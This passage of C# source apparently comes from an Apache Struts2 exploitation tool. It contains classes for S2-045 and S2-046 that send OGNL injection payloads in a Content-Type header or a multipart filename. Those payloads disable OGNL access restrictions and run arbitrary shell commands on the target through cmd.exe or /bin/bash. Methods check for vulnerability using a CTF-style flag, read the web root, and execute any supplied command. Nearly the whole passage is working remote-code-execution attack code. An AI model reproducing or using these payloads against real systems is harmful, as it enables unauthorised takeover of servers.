            private static string rceExp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='$CMD$').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

            public S2_045(string Url) : base(Url)
            { }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = testPoc;
                    req.ProtocolVersion = HttpVersion.Version10; // important!
                    req.ContentLength = Encoding.ASCII.GetByteCount(testPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(testPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    Console.WriteLine(retString);
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = webRootPoc;
                    req.ProtocolVersion = HttpVersion.Version10; // important!
                    req.ContentLength = Encoding.ASCII.GetByteCount(webRootPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(webRootPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", cmdlet);
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest req0 = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req0.GetResponse();
                    req0.Abort();
                    string thisExp = BuildRCEExploit(cmdlet);
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = thisExp;
                    req.ProtocolVersion = HttpVersion.Version10; // important!
                    req.ContentLength = 0;
                    // Create a POSTData Stream and Write POST Data into it

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                string retCandicate = retString.Replace('\0', ' ').Trim();
                return retCandicate;
            }
        }

        class S2_046 : VulModel
        {
            private static string testPoc = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo fctf{d57162c35fe74e4c122aca2c8b9e9a25}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b";
            private static string webRootPoc = "%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath('/'))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b";
            private static string rceExp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='$CMD$').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b";

            public S2_046(string Url) : base(Url)
            { }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    var memStream = new MemoryStream();
                    var webRequest = (HttpWebRequest)WebRequest.Create(targetUrl);
                    // 边界符
                    var boundary = "---------------" + DateTime.Now.Ticks.ToString("x");
                    // 边界符
                    var beginBoundary = Encoding.UTF8.GetBytes("--" + boundary + "\r\n");
                    // 最后的结束符
                    var endBoundary = Encoding.UTF8.GetBytes("--" + boundary + "--\r\n");

                    // 设置属性
                    webRequest.Method = "POST";
                    webRequest.Timeout = 5;
                    webRequest.ProtocolVersion = HttpVersion.Version10;
                    webRequest.Accept = "*/*";
                    webRequest.SendChunked = true;
                    webRequest.TransferEncoding = "gzip";
                    webRequest.UserAgent = "python-requests/2.18.1";
                    webRequest.ContentType = "multipart/form-data; boundary=" + boundary;


                    // 写入文件
                    string filePartHeader =
                        "Content-Disposition: form-data; name=\"aaa\"; filename=\"" + testPoc + "\"\r\n" +
                         "Content-Type: text/plain\r\n\r\n";
                    var header = filePartHeader;
                    var headerbytes = Encoding.UTF8.GetBytes(header);

                    memStream.Write(beginBoundary, 0, beginBoundary.Length);
                    memStream.Write(headerbytes, 0, headerbytes.Length);

                    var buffer = new byte[1024];


                    // 写入最后的结束边界符
                    memStream.Write(endBoundary, 0, endBoundary.Length);

                    webRequest.ContentLength = memStream.Length;

                    var requestStream = webRequest.GetRequestStream();

                    memStream.Position = 0;
                    var tempBuffer = new byte[memStream.Length];
                    memStream.Read(tempBuffer, 0, tempBuffer.Length);
                    memStream.Close();

                    requestStream.Write(tempBuffer, 0, tempBuffer.Length);
                    requestStream.Close();

                    var httpWebResponse = (HttpWebResponse)webRequest.GetResponse();

                    using (var httpStreamReader = new StreamReader(httpWebResponse.GetResponseStream(),
                                                                    Encoding.GetEncoding("utf-8")))
                    {
                        retString = httpStreamReader.ReadToEnd();
                    }

                    httpWebResponse.Close();
                    webRequest.Abort();

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    //Console.WriteLine(retString);
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    var memStream = new MemoryStream();
                    var webRequest = (HttpWebRequest)WebRequest.Create(targetUrl);
                    // 边界符
                    var boundary = "---------------" + DateTime.Now.Ticks.ToString("x");
                    // 边界符
                    var beginBoundary = Encoding.UTF8.GetBytes("--" + boundary + "\r\n");
                    // 最后的结束符
                    var endBoundary = Encoding.UTF8.GetBytes("--" + boundary + "--\r\n");

                    // 设置属性
                    webRequest.Method = "POST";
                    webRequest.Timeout = 5;
                    webRequest.ProtocolVersion = HttpVersion.Version10;
                    webRequest.Accept = "*/*";
                    webRequest.SendChunked = true;
                    webRequest.TransferEncoding = "gzip";
                    webRequest.UserAgent = "python-requests/2.18.1";
                    webRequest.ContentType = "multipart/form-data; boundary=" + boundary;


                    // 写入文件
                    string filePartHeader =
                        "Content-Disposition: form-data; name=\"aaa\"; filename=\"" + webRootPoc + "\"\r\n" +
                         "Content-Type: text/plain\r\n\r\n";
                    var header = filePartHeader;
                    var headerbytes = Encoding.UTF8.GetBytes(header);

                    memStream.Write(beginBoundary, 0, beginBoundary.Length);
                    memStream.Write(headerbytes, 0, headerbytes.Length);

                    var buffer = new byte[1024];


                    // 写入最后的结束边界符
                    memStream.Write(endBoundary, 0, endBoundary.Length);

                    webRequest.ContentLength = memStream.Length;

                    var requestStream = webRequest.GetRequestStream();

                    memStream.Position = 0;
                    var tempBuffer = new byte[memStream.Length];
                    memStream.Read(tempBuffer, 0, tempBuffer.Length);
                    memStream.Close();

                    requestStream.Write(tempBuffer, 0, tempBuffer.Length);
                    requestStream.Close();

                    var httpWebResponse = (HttpWebResponse)webRequest.GetResponse();

                    using (var httpStreamReader = new StreamReader(httpWebResponse.GetResponseStream(),
                                                                    Encoding.GetEncoding("utf-8")))
                    {
                        retString = httpStreamReader.ReadToEnd();
                    }

                    httpWebResponse.Close();
                    webRequest.Abort();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", cmdlet);
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    string thisExp = BuildRCEExploit(cmdlet);
                    var memStream = new MemoryStream();
                    var webRequest = (HttpWebRequest)WebRequest.Create(targetUrl);
                    // 边界符
                    var boundary = "---------------" + DateTime.Now.Ticks.ToString("x");
                    // 边界符
                    var beginBoundary = Encoding.UTF8.GetBytes("--" + boundary + "\r\n");
                    // 最后的结束符
                    var endBoundary = Encoding.UTF8.GetBytes("--" + boundary + "--\r\n");

                    // 设置属性
                    webRequest.Method = "POST";
                    webRequest.Timeout = 5;
                    webRequest.ProtocolVersion = HttpVersion.Version10;
                    webRequest.Accept = "*/*";
                    webRequest.SendChunked = true;
                    webRequest.TransferEncoding = "gzip";
                    webRequest.UserAgent = "python-requests/2.18.1";
                    webRequest.ContentType = "multipart/form-data; boundary=" + boundary;


                    // 写入文件
                    string filePartHeader =
                        "Content-Disposition: form-data; name=\"aaa\"; filename=\"" + thisExp + "\"\r\n" +
                         "Content-Type: text/plain\r\n\r\n";
                    var header = filePartHeader;
                    var headerbytes = Encoding.UTF8.GetBytes(header);

                    memStream.Write(beginBoundary, 0, beginBoundary.Length);
                    memStream.Write(headerbytes, 0, headerbytes.Length);

                    var buffer = new byte[1024];


                    // 写入最后的结束边界符
                    memStream.Write(endBoundary, 0, endBoundary.Length);

                    webRequest.ContentLength = memStream.Length;

                    var requestStream = webRequest.GetRequestStream();

                    memStream.Position = 0;
                    var tempBuffer = new byte[memStream.Length];
                    memStream.Read(tempBuffer, 0, tempBuffer.Length);
                    memStream.Close();

                    requestStream.Write(tempBuffer, 0, tempBuffer.Length);
                    requestStream.Close();

                    var httpWebResponse = (HttpWebResponse)webRequest.GetResponse();

                    using (var httpStreamReader = new StreamReader(httpWebResponse.GetResponseStream(),
                                                                    Encoding.GetEncoding("utf-8")))
                    {
                        retString = httpStreamReader.ReadToEnd();
                    }

                    httpWebResponse.Close();
                    webRequest.Abort();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString.Replace('\0', ' ').Trim();
            }
        }
    }
}
